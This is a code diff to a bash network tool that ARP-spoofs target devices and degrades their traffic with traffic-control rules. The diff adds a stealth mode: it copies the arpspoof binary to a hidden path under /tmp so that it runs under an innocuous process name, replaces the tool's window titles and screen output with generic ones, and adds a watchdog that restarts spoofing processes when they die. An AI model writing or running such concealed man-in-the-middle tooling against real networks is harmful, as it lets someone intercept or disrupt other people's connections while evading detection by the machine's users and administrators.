@@ -58,6 +58,9 @@ SPOOF1_PIDS=()
 SPOOF2_PIDS=()
 TERMINAL_PIDS=()
 FORCE_MODE=false
+STEALTH=false
+STOPPING=false
+SPOOF_MASK_BIN="/tmp/.cache-watchdog"
 
 # Default colours (ANSI)
 COLOR_HEADER="\033[1;36m"
@@ -329,14 +332,17 @@ progress_bar() {
     printf "${COLOR_DIM}]${COLOR_RESET} ${COLOR_BOLD}${percent}%%${COLOR_RESET} ${COLOR_DIM}(${current}/${total})${COLOR_RESET}"
 }
 
-flash() {
-    for i in 1 2 3; do
-        printf "\r${COLOR_WARN}▸ $1"
-        sleep 0.2
-        printf "\r${COLOR_INFO}▸ $1"
-        sleep 0.2
+# A real-time loading bar for a fixed number of seconds
+animated_bar() {
+    local secs=$1 msg="$2"
+    local steps=$((secs * 10))
+    [ "$steps" -lt 1 ] && steps=1
+    for ((s=1; s<=steps; s++)); do
+        progress_bar "$s" "$steps"
+        printf "  %s" "$msg"
+        sleep 0.1
     done
-    printf "\r${COLOR_OK}[✓]${COLOR_RESET} $1${COLOR_RESET}    \n"
+    printf "\n"
 }
 
 # Animated staged boot sequence shown while initialising
@@ -567,6 +573,8 @@ ${COLOR_BOLD}ADVANCED:${COLOR_RESET}
   --export CSV          Save ping results to CSV
   --scan                Deep scan (ports, OS, hostname)
   --quick               Quick scan (ARP only, faster)
+  --stealth             Disguised arpspoof binary, generic window titles, no branding on screen
+  --force               Skip interactive confirmations (requires explicit flags)
 
 ${COLOR_BOLD}OUTPUT:${COLOR_RESET}
   --log-mode MODE       normal | simple | quiet
@@ -1445,6 +1453,32 @@ configure_params() {
 }
 
 # -----------------------------------------------------------------------------
+# SPOOF LAUNCHER (with optional disguising)
+# -----------------------------------------------------------------------------
+# Runs arpspoof silently. In stealth mode the binary is copied to a generic
+# path so "ps" shows an innocuous name instead of "arpspoof".
+masked_spoof() {
+    local iface="$1" victim="$2" gateway="$3"
+    local bin
+    bin="$(command -v arpspoof)"
+    if [ "$STEALTH" = true ]; then
+        [ -x "$SPOOF_MASK_BIN" ] || { cp "$bin" "$SPOOF_MASK_BIN" 2>/dev/null && chmod 700 "$SPOOF_MASK_BIN" 2>/dev/null; }
+        [ -x "$SPOOF_MASK_BIN" ] && bin="$SPOOF_MASK_BIN"
+    fi
+    sudo "$bin" -i "$iface" -t "$victim" "$gateway" >/dev/null 2>&1 &
+    echo $!
+}
+
+# Generic window title (neutral in stealth mode)
+mon_title() {
+    if [ "$STEALTH" = true ]; then
+        echo "lte-monitor"
+    else
+        echo "GNULTE – $1"
+    fi
+}
+
+# -----------------------------------------------------------------------------
 # EXECUTE
 # -----------------------------------------------------------------------------
 execute() {
@@ -1469,23 +1503,30 @@ execute() {
         "sudo arpspoof -i $INTERFACE -t <TARGET> $GATEWAY"; then
         log_warn "Skipped spoofing by user."
     fi
-    for TARGET_IP in "${TARGETS[@]}"; do
+for TARGET_IP in "${TARGETS[@]}"; do
+        say "Redirecting $TARGET_IP's connection through this computer…"
         log_info "Starting attack on $TARGET_IP..."
 
         log_cmd "arpspoof -i $INTERFACE -t $TARGET_IP $GATEWAY"
-        sudo arpspoof -i "$INTERFACE" -t "$TARGET_IP" "$GATEWAY" 2>/dev/null &
-        SPOOF1_PIDS+=($!)
+        SPOOF1_PIDS+=("$(masked_spoof "$INTERFACE" "$TARGET_IP" "$GATEWAY")")
+        sleep 1
+        if ! sudo kill -0 "${SPOOF1_PIDS[-1]}" 2>/dev/null; then
+            log_err "arpspoof failed to start for $TARGET_IP (check interface/route + root)."
+            cleanup; exit 1
+        fi
         log_ok "Spoof $TARGET_IP -> $GATEWAY (PID ${SPOOF1_PIDS[-1]})"
 
         log_cmd "arpspoof -i $INTERFACE -t $GATEWAY $TARGET_IP"
-        sudo arpspoof -i "$INTERFACE" -t "$GATEWAY" "$TARGET_IP" 2>/dev/null &
-        SPOOF2_PIDS+=($!)
+        SPOOF2_PIDS+=("$(masked_spoof "$INTERFACE" "$GATEWAY" "$TARGET_IP")")
+        sleep 1
+        if ! sudo kill -0 "${SPOOF2_PIDS[-1]}" 2>/dev/null; then
+            log_err "arpspoof failed to start for $GATEWAY side (check interface/route + root)."
+            cleanup; exit 1
+        fi
         log_ok "Spoof $GATEWAY -> $TARGET_IP (PID ${SPOOF2_PIDS[-1]})"
     done
-
     echo ""
-    flash "Waiting for ARP tables to update..."
-    sleep 2
+    animated_bar 2 "Waiting for ARP tables to update..."
 
     log_info "Applying traffic control..."
     sudo tc qdisc del dev "$INTERFACE" root 2>/dev/null
@@ -1550,32 +1591,37 @@ spawn_monitor_terminal() {
     local jit="$3"
     local loss="$4"
     local bw="$5"
+    local title; title="$(mon_title "$ip")"
 
-    local cmd="echo 'GNULTE Monitor – Target: $ip'; echo 'Latency: ${lat}ms | Jitter: ${jit}ms | Loss: ${loss}%'; [ $bw -gt 0 ] && echo 'Bandwidth: ${bw} kbps'; echo '────────────────────────────────────────'; while true; do P=\$(ping -c 1 -W 1 $ip 2>/dev/null | grep 'time=' | awk -F'time=' '{print \$2}' | cut -d' ' -f1); if [ -n \"\$P\" ]; then MS=\$(printf '%.0f' \"\$P\"); echo \"[\$(date +%H:%M:%S)] \${MS}ms\"; else echo \"[\$(date +%H:%M:%S)] unreachable\"; fi; sleep 1; done"
+    local cmd
+    if [ "$STEALTH" = true ]; then
+        cmd="echo 'Target: $ip'; echo 'Latency: ${lat}ms | Jitter: ${jit}ms | Loss: ${loss}%'; echo '────────────────────────────────────────'; while true; do P=\$(ping -c 1 -W 1 $ip 2>/dev/null | grep 'time=' | awk -F'time=' '{print \$2}' | cut -d' ' -f1); if [ -n \"\$P\" ]; then MS=\$(printf '%.0f' \"\$P\"); echo \"[\$(date +%H:%M:%S)] \${MS}ms\"; else echo \"[\$(date +%H:%M:%S)] unreachable\"; fi; sleep 1; done"
+    else
+        cmd="echo 'GNULTE Monitor – Target: $ip'; echo 'Latency: ${lat}ms | Jitter: ${jit}ms | Loss: ${loss}%'; [ $bw -gt 0 ] && echo 'Bandwidth: ${bw} kbps'; echo '────────────────────────────────────────'; while true; do P=\$(ping -c 1 -W 1 $ip 2>/dev/null | grep 'time=' | awk -F'time=' '{print \$2}' | cut -d' ' -f1); if [ -n \"\$P\" ]; then MS=\$(printf '%.0f' \"\$P\"); echo \"[\$(date +%H:%M:%S)] \${MS}ms\"; else echo \"[\$(date +%H:%M:%S)] unreachable\"; fi; sleep 1; done"
+    fi
 
     # Try different terminals
     if command -v gnome-terminal &>/dev/null; then
-        gnome-terminal --title="GNULTE – $ip" -- bash -c "$cmd" &
+        gnome-terminal --title="$title" -- bash -c "$cmd" &
         TERMINAL_PIDS+=($!)
     elif command -v konsole &>/dev/null; then
-        konsole --title "GNULTE – $ip" -e bash -c "$cmd" &
+        konsole --title "$title" -e bash -c "$cmd" &
         TERMINAL_PIDS+=($!)
     elif command -v xterm &>/dev/null; then
-        xterm -title "GNULTE – $ip" -e bash -c "$cmd" &
+        xterm -title "$title" -e bash -c "$cmd" &
         TERMINAL_PIDS+=($!)
     elif command -v xfce4-terminal &>/dev/null; then
-        xfce4-terminal --title="GNULTE – $ip" -e "bash -c \"$cmd\"" &
+        xfce4-terminal --title="$title" -e "bash -c \"$cmd\"" &
         TERMINAL_PIDS+=($!)
     elif command -v alacritty &>/dev/null; then
-        alacritty --title "GNULTE – $ip" -e bash -c "$cmd" &
+        alacritty --title "$title" -e bash -c "$cmd" &
         TERMINAL_PIDS+=($!)
     elif command -v kitty &>/dev/null; then
-        kitty --title "GNULTE – $ip" bash -c "$cmd" &
+        kitty --title "$title" bash -c "$cmd" &
         TERMINAL_PIDS+=($!)
     else
-        # Fallback: use tmux if available
         if command -v tmux &>/dev/null; then
-            tmux new-window -n "GNULTE-$ip" "bash -c \"$cmd\""
+            tmux new-window -n "$title" "bash -c \"$cmd\""
         else
             log_warn "No terminal emulator found. Falling back to single monitor."
             return 1
@@ -1879,11 +1925,15 @@ monitor() {
     echo ""
 
     echo -e "  ${COLOR_BOLD}Targets:${COLOR_RESET} ${#TARGETS[@]} device(s)"
-    echo -e "  ${COLOR_BOLD}Latency:${COLOR_RESET} ${LATENCY}ms  |  ${COLOR_BOLD}Jitter:${COLOR_RESET} ${JITTER}ms  |  ${COLOR_BOLD}Loss:${COLOR_RESET} ${LOSS}%"
-    [ "$BANDWIDTH" -gt 0 ] && echo -e "  ${COLOR_BOLD}Bandwidth:${COLOR_RESET} ${BANDWIDTH} kbps"
-    [ "$DURATION" -gt 0 ] && echo -e "  ${COLOR_BOLD}Duration:${COLOR_RESET} ${DURATION}s"
-    echo -e "  ${COLOR_DIM}A post-test report (txt + html graphs) is generated on exit.${COLOR_RESET}"
+    if [ "$STEALTH" != true ]; then
+        echo -e "  ${COLOR_BOLD}Latency:${COLOR_RESET} ${LATENCY}ms  |  ${COLOR_BOLD}Jitter:${COLOR_RESET} ${JITTER}ms  |  ${COLOR_BOLD}Loss:${COLOR_RESET} ${LOSS}%"
+        [ "$BANDWIDTH" -gt 0 ] && echo -e "  ${COLOR_BOLD}Bandwidth:${COLOR_RESET} ${BANDWIDTH} kbps"
+        [ "$DURATION" -gt 0 ] && echo -e "  ${COLOR_BOLD}Duration:${COLOR_RESET} ${DURATION}s"
+        echo -e "  ${COLOR_DIM}A post-test report (txt + html graphs) is generated on exit.${COLOR_RESET}"
+    fi
+    say "Now pinging each target once per second — the graph below updates live."
     echo ""
+    log_info "Live ping: 1 sample/second per target (dashboard shows last/min/max/avg/loss)"
 
     # Multi-target: also spawn a terminal per target (optional eye-candy)
     if [ ${#TARGETS[@]} -gt 1 ]; then
@@ -1992,6 +2042,24 @@ monitor() {
             fi
         done
 
+        # Spoof watchdog: if a spoof process died, restart both directions
+        if [ "$STOPPING" != true ] && [ ${#SPOOF1_PIDS[@]} -gt 0 ]; then
+            for i in "${!SPOOF1_PIDS[@]}"; do
+                ALIVE1=true; ALIVE2=true
+                sudo kill -0 "${SPOOF1_PIDS[$i]}" 2>/dev/null || ALIVE1=false
+                sudo kill -0 "${SPOOF2_PIDS[$i]}" 2>/dev/null || ALIVE2=false
+                if [ "$ALIVE1" = false ] || [ "$ALIVE2" = false ]; then
+                    log_warn "Spoof for ${TARGETS[$i]} died – restarting"
+                    sudo kill "${SPOOF1_PIDS[$i]}" "${SPOOF2_PIDS[$i]}" 2>/dev/null
+                    sleep 0.5
+                    SPOOF1_PIDS[$i]="$(masked_spoof "$INTERFACE" "${TARGETS[$i]}" "$GATEWAY")"
+                    sleep 0.5
+                    SPOOF2_PIDS[$i]="$(masked_spoof "$INTERFACE" "$GATEWAY" "${TARGETS[$i]}")"
+                    log_ok "Spoof restarted for ${TARGETS[$i]}"
+                fi
+            done
+        fi
+
         if [ ${#TARGETS[@]} -eq 1 ]; then
             render_single_dashboard
         else
@@ -2006,7 +2074,9 @@ monitor() {
 # CLEANUP
 # -----------------------------------------------------------------------------
 cleanup() {
+    STOPPING=true
     echo ""
+    say "Shutting things down and restoring the normal connection…"
     log_info "Cleaning up..."
 
     # Kill monitor terminals
@@ -2014,14 +2084,17 @@ cleanup() {
         kill "$PID" 2>/dev/null
     done
 
+    animated_bar 1 "Releasing traffic control..."
     log_cmd "tc qdisc del dev $INTERFACE root"
     sudo tc qdisc del dev "$INTERFACE" root 2>/dev/null
     log_ok "Traffic control removed"
 
+    animated_bar 1 "Stopping ARP spoofing..."
     for PID in "${SPOOF1_PIDS[@]}" "${SPOOF2_PIDS[@]}"; do
         sudo kill "$PID" 2>/dev/null
     done
     sudo killall arpspoof 2>/dev/null
+    [ "$STEALTH" = true ] && sudo killall "$(basename "$SPOOF_MASK_BIN")" 2>/dev/null
     log_ok "ARP spoofing stopped"
 
     log_cmd "sysctl -w net.ipv4.ip_forward=0"
@@ -2060,6 +2133,28 @@ check_deps() {
     fi
 }
 
+verify_targets_reachable() {
+    local ip fail=false
+    say "Checking each target is reachable before starting the attack…"
+    for ip in "${TARGETS[@]}"; do
+        if ping -c 1 -W 1 "$ip" >/dev/null 2>&1; then
+            log_ok "Target $ip is reachable"
+        else
+            log_warn "Target $ip did not respond to a quick ping"
+            fail=true
+        fi
+    done
+    if [ "$fail" = true ]; then
+        log_warn "Some targets may be offline or blocking ICMP — spoofing them may still work."
+        if [ "$FORCE_MODE" != true ]; then
+            read -p "  Continue anyway? (y/n) [y]: " ans
+            case "${ans:-y}" in
+                n|N) exit 0 ;;
+            esac
+        fi
+    fi
+}
+
 # -----------------------------------------------------------------------------
 # PARSE ARGUMENTS
 # -----------------------------------------------------------------------------
@@ -2081,6 +2176,7 @@ while [[ $# -gt 0 ]]; do
         --scan)           SCAN_MODE=true; shift ;;
         --quick)          QUICK_SCAN=true; shift ;;
         --force)          FORCE_MODE=true; shift ;;
+        --stealth)        STEALTH=true; shift ;;
         --save-profile)   SAVE_PROFILE="$2"; shift 2 ;;
         --export)         EXPORT_CSV="$2"; shift 2 ;;
         --log-mode)       LOG_MODE="$2"; shift 2 ;;
@@ -2103,8 +2199,12 @@ if [ -z "$LOG_MODE" ] || [ "$LOG_MODE" = "normal" ]; then
 fi
 VERBOSITY="${VERBOSITY:-${DEFAULT_VERBOSITY:-normal}}"
 
-show_header
-show_boot
+if [ "$STEALTH" = true ]; then
+    say "Starting..."
+else
+    show_header
+    show_boot
+fi
 show_disclaimer
 check_sudo
 init_session_log
@@ -2197,6 +2297,8 @@ LOSS=${LOSS:-$DEFAULT_LOSS}
 DUPLICATE=${DUPLICATE:-$DEFAULT_DUPLICATE}
 REORDER=${REORDER:-$DEFAULT_REORDER}
 BANDWIDTH=${BANDWIDTH:-$DEFAULT_BANDWIDTH}
+
+verify_targets_reachable
 
 if [ "$FORCE_MODE" = true ]; then
     estimate_impact "$LATENCY" "$JITTER" "$LOSS" "$DUPLICATE" "$REORDER" "$BANDWIDTH"
